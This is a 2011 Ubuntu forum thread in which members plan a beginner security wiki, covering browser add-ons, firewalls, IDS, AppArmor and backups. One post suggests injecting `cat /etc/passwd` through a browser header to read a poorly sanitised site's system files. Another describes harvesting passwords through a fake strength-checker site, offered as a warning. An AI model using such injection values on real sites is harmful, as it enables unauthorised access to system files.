I was just trying to give a little heads up on sites not to visit for security.jramshu, do we have any links to such websites on the Wiki now? [QUOTE=MrLeek]Well the paragraph that I wrote links into Danger's forum thread  (there's a link there to "common port numbers"), which covers the main  ports that need to be added. Once we get the point across that the port  numbers that you unblock relate to something that you do on the net (web  browsing, email, WoW, etc.) then a lot of the mystery behind firewalls  is removed. [/QUOTE]Yes, I think it's good now.[QUOTE=MrLeek]Well I found  your blogs on WINE recently which I'm slowly digesting and I'll probably  come back with some questions. Re browser security I totally agree, but  it's another long(ish) session in a wiki page. So I keep coming back to  a 2 page document: "The things you must do" (auto security updates,  firewalls, etc); and "Things you should learn about" (analysing sys  logs)
If everyone understands the former then things are a lot better - and  not everyone will have the patience to learn how to read logs. 	[/QUOTE]I was thinking about the format, and I think MrLeek & I are thinking the same thing.  DT's log tutorial, and also haqking's blog on Wine can go in the "things you should learn about" section.  Such an approach would go a long way to tame the amorphous & infinite security beast.

---

### Post by Ms. Daisy on 2011-11-09
> **OpSecShellshock said:**
> OK then, some quick notes while I'm thinking about it (this is just going to be for Firefox since that's what I'm most familiar with):

Preferences: uncheck accept cookies, whitelist sites for specific needs using exceptions, allow for session at most; clear history when closing the browser, don't save history. Don't use the hardware acceleration.

about:config--I'm pretty sure there's something in here where you can disable the ability to run scripts directly from the URL bar, that's probably important

NoScript: well it needs to be installed, but there are a lot of options to go over. Can add a "revoke temporary permissions" button to the toolbar. Can be used to disable WebGL.

Adblock Plus: install, grab the default list, probably fine after that, can block any individual ads or scripts that show up by adding them manually

BetterPrivacy: remove all LSOs when closing the browser (and after every known use of Flash content). Can add a button to the toolbar to make it easy to call up.

RefControl: strips out referrer headers, makes some malicious sites think you're a search bot or malware researcher, and otherwise stops the collection of referral information.

RequestPolicy: not for lightweights, very similar to NoScript and probably has some redundancy, good for an education in how pages on the web actually load/function

Plugins: disable Java/OpenJDK plugins, disable plugin to load PDFs in the browser window

EDIT: Almost forgot: use BleachBit after every browsing session.This is great info.  What's your plan with this? I won't stop you if you or DT already have plans to write it.  But if not, I could write something up based on this outline.

---

### Post by Dangertux on 2011-11-09
> 
This is great info.  What's your plan with this? I won't stop you if you  or DT already have plans to write it.  But if not, I could write  something up based on this outline. 	


In my opinion this information is more vital to the average end user, and while I'm more than willing to "buff" up whatever data you guys come up with I think the "newbies" in the argument should make an endeavor on this one, as browser security really is paramount. 

The only reason I even went ahead and wrote the whole "Did I get Owned" section is it's more obscure and requires a little bit of experience in having seen an owned linux box (which most new users haven't)

On a side note I'm debating adding two more sections to did I get owned, but I don't know and want some opinions. The two sections I wanted to add were the following

- Auditing Service Logs for 0 day : Detecting fuzzing attempts on services. 
- Auditing IDS/P Logs : Auditing IDS logs and creating advanced IDS rules

both of these are more advanced and cater toward the server side of the house, so I'm looking for opinions before I write them.

---

### Post by MrLeek on 2011-11-09
> **Dangertux said:**
> In my opinion this information is more vital to the average end user, and while I'm more than willing to "buff" up whatever data you guys come up with I think the "newbies" in the argument should make an endeavor on this one, as browser security really is paramount. 

The only reason I even went ahead and wrote the whole "Did I get Owned" section is it's more obscure and requires a little bit of experience in having seen an owned linux box (which most new users haven't)

On a side note I'm debating adding two more sections to did I get owned, but I don't know and want some opinions. The two sections I wanted to add were the following

- Auditing Service Logs for 0 day : Detecting fuzzing attempts on services. 
- Auditing IDS/P Logs : Auditing IDS logs and creating advanced IDS rules

both of these are more advanced and cater toward the server side of the house, so I'm looking for opinions before I write them.

Well I was planning to do something on the browser front - I can do parts of it, but I might struggle with others. Will struggle for time for the next few days so if Ms Daisy wants to take it on then no objections here. I agree with the "newbies should write this" - it's something tangible to get your teeth around, whereas analysing syslogs needs a fair bit of knowledge before you can really try.

On that subject - my newbie tip(s) for analysing logs (so far):
1) Search for "bits" of the log via Google: "Program phalanx tried to access /dev/mem" gives enough results off the front page to make me realise there's a problem
2) Search for "password" in auth.log. If you find it loads of times then you might be looking at a brute force attack.

Of course it misses loads of things - but rather detect 20% of problems than go "gee - that log stuff looks complex" and go load MW3 or something...

Side Note: IDS makes sense ("things you should learn section" I think). The other one sounds tricky to put into newbie speak - but then you're one of ma hero's!!! :P

---

### Post by MrLeek on 2011-11-09
...and footnote:

[http://navigators.com/cgi-bin/navigators/persona.pl](http://navigators.com/cgi-bin/navigators/persona.pl)

Worth explaining in a newbie guide? Does that site have decent material to use?

---

### Post by WasMeHere on 2011-11-09
I think that as long as you experts feel inspired and add from your deep knowledge, it will be ***very valuable*** :-)

This is my vision of our wiki page:

The main page (front page) should be brief as an introduction or overview for newbies, so that we understand that there are several aspects of it rather than one patent solution.

Then there should be links, digested links (like you are writing now), and various more or less advanced links. These links will help us to take the next step according to our individual need.

Olle

---

### Post by Dangertux on 2011-11-09
I don't know about visions and expert knowledge and all that but here's a one shot I wrote for you guys on how to install Suricata as a DPI firewall (IPS) in conjunction with iptables if anyone wants to mess around with it and try to incorporate "advanced" firewalling into the wiki

[http://dangertux.wordpress.com/2011/11/09/building-a-better-firewall-with-ubuntu/](http://dangertux.wordpress.com/2011/11/09/building-a-better-firewall-with-ubuntu/)

I did this because someone asked about IDS and Snort is stupid.

---

### Post by Dangertux on 2011-11-09
Oh and about the navigators thing. You should use it as an example of what NOT to do.

Seeing as though websites that read and trust browser headers are pretty much stupid unless scrutinized extremely well... As you can see from the screenshot below I had my fun with my browser header.

Now imagine if I changed my browser header to

`cat /etc/passwd`

wonder what his CGI (which likely has access to a lot more than it should) would have spit out as its response.

So to him I say stop worrying about my persona and start sanitizing your input ;-)

---

### Post by Ms. Daisy on 2011-11-09
> **Dangertux said:**
> Oh and about the navigators thing. You should use it as an example of what NOT to do.

Seeing as though websites that read and trust browser headers are pretty much stupid unless scrutinized extremely well... As you can see from the screenshot below I had my fun with my browser header.

Now imagine if I changed my browser header to

`cat /etc/passwd`

wonder what his CGI (which likely has access to a lot more than it should) would have spit out as its response.You crack me up.  It's always such a mystery how you feel about stuff.

I'm sure there are "new users" of Ubuntu that are quite familiar with compiling software & basic networking, so I think we should link to DT's blog in the Wiki.  It is beyond my ability to write a synopsis of your blog post more in depth than this "If you are familiar with basic networking and with compiling software, then you can incorporate intrusion detection and prevention capabilities into your Ubuntu firewall."

And I'll try to conquer the browser discussion.  Then when DT, opsecshellshock & haqking are done laughing at my feeble understanding of the subject matter, they can edit the crap out of it. :)

---

### Post by Ms. Daisy on 2011-11-09
> **Olle Wiklund said:**
> I think that as long as you experts feel inspired and add from your deep knowledge, it will be ***very valuable*** :-)

This is my vision of our wiki page:

The main page (front page) should be brief as an introduction or overview for newbies, so that we understand that there are several aspects of it rather than one patent solution.

Then there should be links, digested links (like you are writing now), and various more or less advanced links. These links will help us to take the next step according to our individual need.

OlleYup, we're all on the same page.

---

### Post by Ms. Daisy on 2011-11-09
> **Dangertux said:**
> On a side note I'm debating adding two more sections to did I get owned, but I don't know and want some opinions. The two sections I wanted to add were the following

- Auditing Service Logs for 0 day : Detecting fuzzing attempts on services. 
- Auditing IDS/P Logs : Auditing IDS logs and creating advanced IDS rules

both of these are more advanced and cater toward the server side of the house, so I'm looking for opinions before I write them.I find it confusing when server discussions get mixed in with desktop, non-server discussions.  I would support the inclusion of such information if you can clarify the division between the two, if such a division exists.  I hope that makes sense. Maybe what I'm asking is can you create a "desktop" section and a separate "server" section?

And forgive me if this is all sailing at 40,000 feet above my head.  But does your "Building a Better Firewall" blog post address "Auditing IDS/P Logs : Auditing IDS logs and creating advanced IDS rules"?

---

### Post by Dangertux on 2011-11-09
> **Ms. Daisy said:**
> I find it confusing when server discussions get mixed in with desktop, non-server discussions.  I would support the inclusion of such information if you can clarify the division between the two, if such a division exists.  I hope that makes sense. Maybe what I'm asking is can you create a "desktop" section and a separate "server" section?

And forgive me if this is all sailing at 40,000 feet above my head.  But does your "Building a Better Firewall" blog post address "Auditing IDS/P Logs : Auditing IDS logs and creating advanced IDS rules"?


No it just covers the basics of setting up the ips and using a default rules set. 

I was going to write more but I'm feeling cruddy today and didn't go for the gusto lol.

---

### Post by CharlesA on 2011-11-09
> **Dangertux said:**
> No it just covers the basics of setting up the ips and using a default rules set. 

I was going to write more but I'm feeling cruddy today and didn't go for the gusto lol.
Lol. Happens to everyone.

Excellent writeup btw.

---

### Post by OpSecShellshock on 2011-11-09
Heh, and here I was going to suggest IDS/IPS and file activity monitoring and the like as part of a separate, "intermediate" section. Apparmor configuration might actually be considered intermediate as well, now that I think about it. I mean beyond "you should use this." Like, there are certain security tools that you can just configure (with caveats), and then there are the ones that you have to regularly and actively engage with in order for them to do as much good as they can, and I'm not sure those are ever going to be new user friendly.

I do like the idea of the new users taking on the bulk of the browser security section, because you know, in addition to being able to put it in language that makes sense to other new users, it will allow you all to research, dig in a little, and play with various configurations of the add-ons. I am available (mostly) to consult; after all Consultant is really the only job title that seems to exist in this field. Also I have a three-day weekend coming up so there should be time to provide input.

---

### Post by Ms. Daisy on 2011-11-09
> **OpSecShellshock said:**
> Heh, and here I was going to suggest IDS/IPS and file activity monitoring and the like as part of a separate, "intermediate" section. Apparmor configuration might actually be considered intermediate as well, now that I think about it. I mean beyond "you should use this." Like, there are certain security tools that you can just configure (with caveats), and then there are the ones that you have to regularly and actively engage with in order for them to do as much good as they can, and I'm not sure those are ever going to be new user friendly. I think you hit the motherload with that comment. How about we use your concept to name the 2 sections of the Wiki:
1. Security tools easier to configure & use
2. Security tools you have to regularly & actively engage
 and like you said, AppArmor goes in that section with a link to the AppArmor sticky.  

I'm going to rearrange the Wiki with that aim in mind.  Let me know what you think.

---

### Post by Dangertux on 2011-11-09
> **CharlesA said:**
> Lol. Happens to everyone.

Excellent writeup btw.

Thank you :-)

As far as ID/PS maintenance and writing the rules goes, that is one of those ever expanding things. It can be very complicated based on the threat. However the emerging threats database is usually pretty complete.


Apparmor, has a pretty steep learning curve for new users, however once you master it creating profiles for most applications is fairly simple. It only gets tricky when you deal with apps that have to change hats alot (Apache being one)

---

### Post by OpSecShellshock on 2011-11-09
> **Ms. Daisy said:**
> I think you hit the motherload with that comment. How about we use your concept to name the 2 sections of the Wiki:
1. Security tools easier to configure & use
2. Security tools you have to regularly & actively engage
 and like you said, AppArmor goes in that section with a link to the AppArmor sticky.  

I'm going to rearrange the Wiki with that aim in mind.  Let me know what you think.

Yeah so remember way back on page like 1 or 2 when we were saying it's really complex when you start to get into it? ;) Oh the scope, it is expanding!

Should probably at least wrap it up before someone suggests PAX kernel or something, though.

---

### Post by Ms. Daisy on 2011-11-09
> **OpSecShellshock said:**
> Yeah so remember way back on page like 1 or 2 when we were saying it's really complex when you start to get into it? ;) Oh the scope, it is expanding!

Should probably at least wrap it up before someone suggests PAX kernel or something, though. You underestimate the usefulness of the simple stuff!  And you also underestimate the more clear division between the simple stuff and the complex stuff. I know it was all obvious to the pros, but 100% of it was complex to me when I started on this endeavor.

---

### Post by OpSecShellshock on 2011-11-09
> **Ms. Daisy said:**
> You underestimate the usefulness of the simple stuff!  And you also underestimate the more clear division between the simple stuff and the complex stuff. I know it was all obvious to the pros, but 100% of it was complex to me when I started on this endeavor.

I've been very impressed by everyone's contributions. You might not know it, but sometimes security seems completely hopeless when trying to get people who aren't really interested to consider the risks and what to do about them. To me this whole process has been really really encouraging.

---

### Post by Ms. Daisy on 2011-11-09
> **OpSecShellshock said:**
> I've been very impressed by everyone's contributions. You might not know it, but sometimes security seems completely hopeless when trying to get people who aren't really interested to consider the risks and what to do about them. To me this whole process has been really really encouraging.Well I felt like my life was going far too smoothly. I was really looking for a career where I could bash my head against the wall 24/7.  ](*,)Glad to know I'm heading in the right direction!:D

---

### Post by Dangertux on 2011-11-09
> **Ms. Daisy said:**
> Well I felt like my life was going far too smoothly. I was really looking for a career where I could bash my head against the wall 24/7.  ](*,)Glad to know I'm heading in the right direction!:D

Haha! 

OpSecShellshock is right, as you transition into this field you will soon realize it is probably the only one where someone pays you for your advice then argues with you. It's actually probably a lot like being a tax preparer lol.

On the topic of the wiki : I beefed up the linux vulnerabilities section a little bit let me know what you guys think.

---

### Post by Thewhistlingwind on 2011-11-10
> **Dangertux said:**
> Haha! 

OpSecShellshock is right, as you transition into this field you will soon realize it is probably the only one where someone pays you for your advice then argues with you. It's actually probably a lot like being a tax preparer lol.


Expert advice no less.

---

### Post by Dangertux on 2011-11-10
> **Thewhistlingwind said:**
> Expert advice no less.

Expertise is in the eye of the beholder. Once my mechanic told me that the throttle body on my insanely over priced but well equipped SUV was having problems, I thought nothing of it and opted not to spend $400 dollars replacing it. I got my oil change and moved on in life. When I took the vehicle for an emissions inspection they told me there was a problem with the engine, I didn't think anything of it. I decided to "ride dirty" until I got my next paycheck and I would pay to have the car repaired. Suffice it to say on the 13th of the month two days before I was going to be paid and repair my car, it burst into flames in the middle of the freeway on my commute home. Ironically, I was strapped financially at the time, two kids a wife who had just lost her source of income, things were rough. I had "let my insurance slide" for a month, under the same stipulation I would reinstate the policy when I got paid again. They obviously did not pay for the damages as it was in the gap when the vehicle was not covered.

Suffice it to say, when my mechanic tells me the beater Honda I was forced to replace the SUV with has problems, I gladly fork over the $300 dollars. Now you're probably thinking what the HECK does a car fire have to do with information security. Well I will tell you what it has to do with it. The couple of minutes it takes to set up your firewall, install a few browser addons and the several seconds it takes to think before you click is equivalent to the $400 I didn't spend.

Hope this helps

P.S : not a true story but a good analogy.

---

### Post by WasMeHere on 2011-11-10
> **Ms. Daisy said:**
> I think you hit the motherload with that comment. How about we use your concept to name the 2 sections of the Wiki:
1. Security tools easier to configure & use
2. Security tools you have to regularly & actively engage
 and like you said, AppArmor goes in that section with a link to the AppArmor sticky.  

I'm going to rearrange the Wiki with that aim in mind.  Let me know what you think.

I was just reading through the present version of our main wiki page, and I'm happy with the division into a short intro and two sections :KS

Now ***all of you*** following this thread: please post feed-back about the structure as well as details about the content!

Olle

---

### Post by MrLeek on 2011-11-10
> **Olle Wiklund said:**
> I was just reading through the present version of our main wiki page, and I'm happy with the division into a short intro and two sections :KS

Now ***all of you*** following this thread: please post feed-back about the structure as well as details about the content!

Olle

Well we're all saying "2 pages is the way to go" - then we try and squeeze everything into one page! ;)

"must do" page - the 90% solution or "easy stuff". e.g. No Script, don't use root, good passwords, set up firewall
"should do" page - the other things. e.g. Ref Control in Firefox, analysing sys logs, Apparmor

There's a blurry section in the middle where things could go either way but that's ok. Further "should do" (ok, "needs to be configured") is still things you must do...but what we're saying is that things in this section take more thought to deliver.

---

### Post by jramshu on 2011-11-10
> **haqking said:**
> I added a little piece to the wiki at the end of the password section about password strength meters.

[https://wiki.ubuntu.com/BasicSecurity#It_All_Starts_With_a_Good_Password](https://wiki.ubuntu.com/BasicSecurity#It_All_Starts_With_a_Good_Password)

I hate these services

I know they are popular, but just remember that you are effectively giving someone online your password and/or passwords...do you trust them especially as they now have your IP address also possibly ?

I could set up the same thing in 10 minutes and then when people search for password tester it may bring them to my site or i could post it here, and sit back and harvest IP addresses and possible passwords to match.

Peace

Haha, that's the kind of stuff I was getting at.

EDIT: It's also a good way to build wordlists/dictionaries/etc...

---

### Post by Ms. Daisy on 2011-11-10
I'm working on beefing up the "how" and "why" in our existing Wiki.  I'm stuck on backups.  There is backing up data & there's backing up the system. There are a ton of options for backing up data, and those seem pretty straight forward.  In regards to backing up the system, I have found how to back it up to a cloud & how to back it up to a secondary drive.  Is there any way to back it up to a bootable DVD?  Remastersys seems to be the only option.  And I'm getting a lot of "just do a clean reinstall" which would be fine except you would lose all this fine security configuring we have done!  Am I even understanding the options correctly?

Edit: I think I answered my own question. I found a great explanation of backups in the ubuntu documentation!  I added a description in the Wiki.

---

### Post by lisati on 2011-11-10
Another thing I see from time is a [s]"Why the need for passwords?"[/s] "How do I turn off the need for a password?", and less often "Why do we need a userid/password?".....

---

### Post by Ms. Daisy on 2011-11-10
> **lisati said:**
> Another thing I see from time is a [s]"Why the need for passwords?"[/s] "How do I turn off the need for a password?", and less often "Why do we need a userid/password?".....
To lisati & all: if we combine the "It All Starts With A Good Password" and the "Don't Log In As Root" discussions, I think we would sufficiently address this with what we've already got in the Wiki.  What do you think?

---

### Post by Dangertux on 2011-11-10
> **Ms. Daisy said:**
> I'm working on beefing up the "how" and "why" in our existing Wiki.  I'm stuck on backups.  There is backing up data & there's backing up the system. There are a ton of options for backing up data, and those seem pretty straight forward.  In regards to backing up the system, I have found how to back it up to a cloud & how to back it up to a secondary drive.  Is there any way to back it up to a bootable DVD?  Remastersys seems to be the only option.  And I'm getting a lot of "just do a clean reinstall" which would be fine except you would lose all this fine security configuring we have done!  Am I even understanding the options correctly?


Honestly for most users, backing up personal data would be fine. In terms of security configurations, what are we really needing to back up in terms of files.

- Some apparmor profiles
- iptables script / ufw config 
- IP/DS rules if you go that route
- browser/addons configuration (which is conveniently in your home directory)
- SSH/PGP keys (also in your home directory)

So if you think about it, backing up the "system" as you put it versus backing up personal data are one in the same in this case.  So I think if you're going to talk about backups, just mention keeping copies of these configurations in your personal files, and backing up the whole shabang might be the most straight forward route to take. 

So ultimately if you backup your home directory with your personal files, and keep copies of the first three items on the list in your home directory it covers the whole thing.

Of course it might be pertinent to mention that keeping a copy of your IDS rules, firewall script and apparmor profiles in your home directory isn't the most sound concept for security, but hey its up to the user to weigh that option. 

Just my 2 cents.

P.S : Sorry for the edit conflict I think I broke it lol...

---

### Post by Ms. Daisy on 2011-11-10
> **Dangertux said:**
> P.S : Sorry for the edit conflict I think I broke it lol... I  think I added one extra line break or something while you added the  whole myth vs. reality discussion, so it was much ado about nothing.> **Dangertux said:**
>  So ultimately if you backup your home directory with your personal files, and keep copies of the first three items on the list in your home directory it covers the whole thing.

Of course it might be pertinent to mention that keeping a copy of your IDS rules, firewall script and apparmor profiles in your home directory isn't the most sound concept for security, but hey its up to the user to weigh that option. So you're backing up the home directory with the personal files in the home directory?  I guess I assumed that  for security reasons one would back up the system off the hard drive or at least on a separate partition. If you were compromised, how would you know whether someone got into the backup in the home directory?  Scratch that- I know how Dangertux would know.:P  If it were me being the clueless noob I am, I would want it separate.

Maybe that explains why I'm having such a hard time finding information about backups in general.  So it's common to backup your data onto the home directory?  That's a totally foreign concept to me.

---

### Post by Dangertux on 2011-11-10
> **Ms. Daisy said:**
> I  think I added one extra line break or something while you added the  whole myth vs. reality discussion, so it was much ado about nothing.So you're backing up the home directory with the personal files in the home directory?  I guess I assumed that  for security reasons one would back up the system off the hard drive or at least on a separate partition. If you were compromised, how would you know whether someone got into the backup in the home directory?  Scratch that- I know how Dangertux would know.:P  If it were me being the clueless noob I am, I would want it separate.

Maybe that explains why I'm having such a hard time finding information about backups in general.  So it's common to backup your data onto the home directory?  That's a totally foreign concept to me.


Oh okay, I think you misunderstood. The backup is not performed to the home directory. The back up is to whatever method you want : DVD's , cloud storage, tape drive, floppies, CDR's, external hard drive, whatever.

However in terms of personal files you would mostly be backing up the contents of your /home directory, at least that is where most people keep their personal files. So the logic is if its important keep a copy of it in the /home directory back up the home directory and everything gets backed up.

Also you bring up an interesting point, a seperated home partition can be a good thing, not so much in terms of a compromised system but in cases where an upgrade goes bad it can save your files.

---

### Post by Thewhistlingwind on 2011-11-10
> **jramshu said:**
> 
Also, don't go investigating how hackers get in by visiting 'their' domain. Remember, even the moderators are hackers. The server logs your ip, your browser and version, your os info, everything you really would rather them not have, and through techniques you guys played with inside your network they can get your router info and check for vulnerabilities. This is critical if you have a forward facing server you are playing with and don't know how to secure it.


Some people do in fact need this information. That's a risk they'll have to take.

> **Dangertux said:**
> 
Of course it might be pertinent to mention that keeping a copy of your  IDS rules, firewall script and apparmor profiles in your home directory  isn't the most sound concept for security, but hey its up to the user to  weigh that option. 



Especially if you don't rename them and I can lift them out of your home directory. 

([http://www.html5rocks.com/en/features/file](http://www.html5rocks.com/en/features/file))

Of course, who would be crazy enough to ASSUME someone has done this?

At the same time, keeping that information in an encrypted form would help mitigate this risk.

Of course, since your keys are in a standard location...

---

### Post by Dangertux on 2011-11-10
> **Thewhistlingwind said:**
> Some people do in fact need this information. That's a risk they'll have to take.



Especially if you don't rename them and I can lift them out of your home directory. 

([http://www.html5rocks.com/en/features/file](http://www.html5rocks.com/en/features/file))

Of course, who would be crazy enough to ASSUME someone has done this?

At the same time, keeping that information in an encrypted form would help mitigate this risk.

Of course, since your keys are in a standard location...


The more I research HTML5 the more I realize that it was a terrible idea lol. That being said this gives me another idea, and an extremely CRUCIAL aspect of any desktop security guide. Locking down your ~/ tighter than fort knox. This is just another reason it should go in there.

That being said this type of access can be mitigated through the use of mandatory access controls as well.

Thoughts?

On a sidenote : realize all of this capability has been in existence for webkit enabled browsers for a while now.

---

### Post by Thewhistlingwind on 2011-11-10
> **Dangertux said:**
> The more I research HTML5 the more I realize that it was a terrible idea lol.

**I like HTML5, I dislike that nobody is even thinking about user privacy.**

That being said this type of access can be mitigated through the use of mandatory access controls as well.

**Of course, as I understand it this is trivial.**

Thoughts?

**Firefox data (Including the password manager) happens to be in there as well. Your ~/ is, to an extent, more important on a single user system than the actual system files. (From a data, not security, perspective.) So yes, as much care should go into the home directory as goes into the / directory.**

On a sidenote : realize all of this capability has been in existence for webkit enabled browsers for a while now.

**Thats what makes it even worse...**



My responses in bold.

---

### Post by Dangertux on 2011-11-10
> **Thewhistlingwind said:**
> My responses in bold.

I agree with most of what you said. Except for two points, and I don't even disagree just want to elaborate.

> 
**Of course, as I understand it this is trivial.**
I'm assuming this was in regards to MAC confinement. It SHOULD be trivial unfortunately for some reason our target platform (Ubuntu) is behind the curve of almost every other major distro in making Mandatory Access Controls ridiculously inaccessible to the average not super-hero security nerd type end user.

and

> 
[B]Firefox data (Including the password manager) happens to be in there  as well. Your ~/ is, to an extent, more important on a single user  system than the actual system files. (From a data, not security,  perspective.) So yes, as much care should go into the home directory as  goes into the / directory.
[/B]I'm 50/50 on this. I think in a desktop installation, what goes in the home directory is often times more valuable. Let's look from a security standpoint at what  is in a home directory. (generally speaking)

- SSH keys to other servers (if they have any) : this is huge, this means not one but 2 compromised machines. (generally)

- Browser saved credentials : let's see who's reusing passwords (this could be devestating, particularly if you like to have you bank "remember you")

- Users have a nasty habit of recording important info in little text files. Bank account numbers, social security numbers, phone numbers, all kinds of stuff. That can be hurtful.

This is all assuming that the system is already compromised, so compare it to / and what do you have. A shadow file, realistically that's about it. So on a desktop system you have two options from there

- Gain root : use system as an attack platform (you may not even need root for this)

- Encrypted Passwords :  Might be useful if they're reusing, but not nearly as useful as their saved credentials. 

That's just one way of looking at it, though it's important to not let the system get compromised to begin with I think protecting ~/ on a desktop system should be of the utmost importance.

---

### Post by OpSecShellshock on 2011-11-10
I tend to favor an approach that involves backing up the home directory and configuration files to external storage (that is not connected most of the time). I actually prefer that for any long-term storage wherever it's reasonable. More sensitive personal files only really need to be stored locally when they're in use, and afterwards can be moved off entirely.

What I'm not sure about exactly is what the permissions/ownership on the backups of otherwise non-user-owned files would be, and if it is OK to just take the backed up versions and copy them to the relevant directories after a clean installation.

Applying constraints to the permissions of the browser process on top of that is also a good idea, as there are plenty of files that aren't strictly sensitive that nonetheless are none of the web's business. I fear, however, that the big players in web space will design their sites and applications in such a way as they will at least act like they need access to the user's native files in order to function. We all know it's not actually a technical requirement, but the sites may try to set it up as a condition of use anyway. I'm willing to walk away if that turns out to be the case, but how many people would say the same?

Really it's not much different than a number of information-grabbing malware campaigns I've run across--scoop up as much data as possible, send it off-site, and figure out how to make money on it at some point before it gets too stale.

---

### Post by Thewhistlingwind on 2011-11-10
> **OpSecShellshock said:**
> 
Applying constraints to the permissions of the browser process on top of that is also a good idea, as there are plenty of files that aren't strictly sensitive that nonetheless are none of the web's business. I fear, however, that the big players in web space will design their sites and applications in such a way as they will at least act like they need access to the user's native files in order to function. We all know it's not actually a technical requirement, but the sites may try to set it up as a condition of use anyway. I'm willing to walk away if that turns out to be the case, but how many people would say the same?


Selinux can protect individual files IIRC. 

If I get an alert from Selinux that essentially says "An attempt was just made to copy your home directory." I would fold my hand and walk away from the table.

I obviously can't trust that service.

Speaking of trust, I think that it's important to emphasize that a lot of security is trust. And that you should consider how much you trust source or service X when evaluating your security decisions.

For example: If I want to watch flash content, I have to accept that by doing so I open myself up to possible attack on several vectors, and that my willingness to do this depends largely on how much I trust this third party.

---

### Post by Dangertux on 2011-11-10
> **Thewhistlingwind said:**
> Selinux can protect individual files IIRC. 

If I get an alert from Selinux that essentially says "An attempt was just made to copy your home directory." I would fold my hand and walk away from the table.

I obviously can't trust that service.

Speaking of trust, I think that it's important to emphasize that a lot of security is trust. And that you should consider how much you trust source or service X when evaluating your security decisions.

For example: If I want to watch flash content, I have to accept that by doing so I open myself up to possible attack on several vectors, and that my willingness to do this depends largely on how much I trust this third party.


Good points here, as well as what OpSecShellshock said. 

SELinux and Apparmor can both protect individual files. That being said, (this is opinion) SELinux's labeling conventions makes it slightly more intuitive.

---

### Post by WasMeHere on 2011-11-11
> **Ms. Daisy said:**
> I'm working on beefing up the "how" and "why" in our existing Wiki.  I'm stuck on backups.  There is backing up data & there's backing up the system. There are a ton of options for backing up data, and those seem pretty straight forward.  In regards to backing up the system, I have found how to back it up to a cloud & how to back it up to a secondary drive.  Is there any way to back it up to a bootable DVD?  Remastersys seems to be the only option.  And I'm getting a lot of "just do a clean reinstall" which would be fine except you would lose all this fine security configuring we have done!  Am I even understanding the options correctly?

Edit: I think I answered my own question. I found a great explanation of backups in the ubuntu documentation!  I added a description in the Wiki.
Hi!

I return to your first post about backup and add my ideas about backup.

1. **External hard drives**

I have been told that optical media (CD, DVD) are not very reliable, so they are not suitable for backup of important data. Instead I think it is worthwhile to use one or two external hard drives (magnetic media) for backup. If possible, keep one hard drive separated in another house (security against fire and theft)!

2. **Mainly data files - Backup home directory and/or data partition**

If your work is mainly in data files (documents, photos, videos ...), then backup your home directory plus a separate data partition if you have one! {reference to Ubuntu's instruction page}

3. **Advanced system - Backup the whole drive or partition(s)**

If you have installed and tweaked at lot of programs, and / or you have another OS for work (not only for testing purposes), then backup the whole drive or the relevant partition(s)! In this case it is a good idea to make an image using e.g. Clonezilla from a live CD or USB drive.

4. **Test that *restore* works**

And finally, unless your backed up data are easily browsed and read, test that your backup is really working! Otherwise, can you rely on it, when your system is damaged? A good test is to restore your backup to a clean hard drive of the same size as your present one to find out if it works. You should notice no difference from your original system (except for drive speed and noise).

5. **Backup at regular intervals**

I suggest that the backup of data should be more frequent than the backup of the whole system. When you intend to do risky operations, make a fresh image of your drive, before! Afterwards it may be to late ;-)

Olle

---

### Post by vanhenryjr on 2011-11-11
Wow, 39 pages of discussion on security for newbies, I would hate to see the advanced course.

I am certainly more newbie than most of you. I read _[I][[COLOR=RoyalBlue][U]https://wiki.ubuntu.com/BasicSecurity_[/COLOR]]("https://wiki.ubuntu.com/BasicSecurity")
[/I][/U]yesterday and after all that "learnin'" I have messed my computer up more than any cracker/virus/etc. Maybe there needs to be a prelim course to qualify for being a newbie. I have already messed up my perfectly working tomboy sync and after disabling all scripts on mozilla having to go back and add in scripts on numerous web sites that I use frequently.

My point, if you know what you are doing go right ahead and secure away, but if you are REALLY new realize many of these security measures will/can disable functionality.

imno and all that, where n=newbie

---

### Post by haqking on 2011-11-11
> **vanhenryjr said:**
> Wow, 39 pages of discussion on security for newbies, I would hate to see the advanced course.

I am certainly more newbie than most of you. I read _[I][[COLOR=RoyalBlue][U]https://wiki.ubuntu.com/BasicSecurity_[/COLOR]]("https://wiki.ubuntu.com/BasicSecurity")
[/I][/U]yesterday and after all that "learnin'" I have messed my computer up more than any cracker/virus/etc. Maybe there needs to be a prelim course to qualify for being a newbie. I have already messed up my perfectly working tomboy sync and after disabling all scripts on mozilla having to go back and add in scripts on numerous web sites that I use frequently.

My point, if you know what you are doing go right ahead and secure away, but if you are REALLY new realize many of these security measures will/can disable functionality.

imno and all that, where n=newbie

I agree with you (sadly).  The thing is Linux assumes you know exactly what you are doing, as does Security.

The thing is if you knew what you were doing there would be no need for the Noob guide, alot of Noobs are finding it productive and useful so far.

There is a learning curve in everything. the most important thing in all of this is BACKUPS.

If you have backups then you can play and trash your system then recover.  If someone else trashes your system due to it not being secure you can recover.

So backup first, learn how to back up and restore (people often overlook the restore side of things, like verifying the integrity of the backup, no point having a backup you cant restore).

Then learn your system and how to secure it.

Peace

---

### Post by OpSecShellshock on 2011-11-11
> **vanhenryjr said:**
> Wow, 39 pages of discussion on security for newbies, I would hate to see the advanced course.

I am certainly more newbie than most of you. I read _[I][[COLOR=RoyalBlue][U]https://wiki.ubuntu.com/BasicSecurity_[/COLOR]]("https://wiki.ubuntu.com/BasicSecurity")
[/I][/U]yesterday and after all that "learnin'" I have messed my computer up more than any cracker/virus/etc. Maybe there needs to be a prelim course to qualify for being a newbie. I have already messed up my perfectly working tomboy sync and after disabling all scripts on mozilla having to go back and add in scripts on numerous web sites that I use frequently.

My point, if you know what you are doing go right ahead and secure away, but if you are REALLY new realize many of these security measures will/can disable functionality.

imno and all that, where n=newbie

Well, it is still in a living document phase. One of the reasons I haven't put my hands in it directly is that I'm afraid of constantly spinning it off onto chaotic tangents while a newer user is trying to make sense of it. I suppose we've forgotten to include Step Zero: define your needs and intentions for the system so you know what security measures to take.

But this much should be made clear: the desire to fire things up and have them run without fuss is always going to be at cross-purposes to the desire to run a system securely.

As far as disabling scripts in the browser and having to whitelist sites used frequently, well, that's pretty much exactly how it's supposed to work. It's a bit heavy up front, but once things are set up it's fine. For a lot of these security steps, disabling functionality is precisely the point.

Tomboy sync I don't use, so I'm not sure what might have happened to cause that to stop working. My best guess is that it's a matter of setting up UFW to allow whatever that process uses.

Also, I think a lot of new user advice is going to work better on a freshly installed system that it will if applied to an older configuration that's been in use for a while.

As far as solving specific problems, I would recommend starting another thread, list the things that worked before, the changes made, what broke, and perhaps we can try to help restore those functions while leaving other things fairly secure. I'd hate to leave you hanging after you made the effort to dive into the security document.
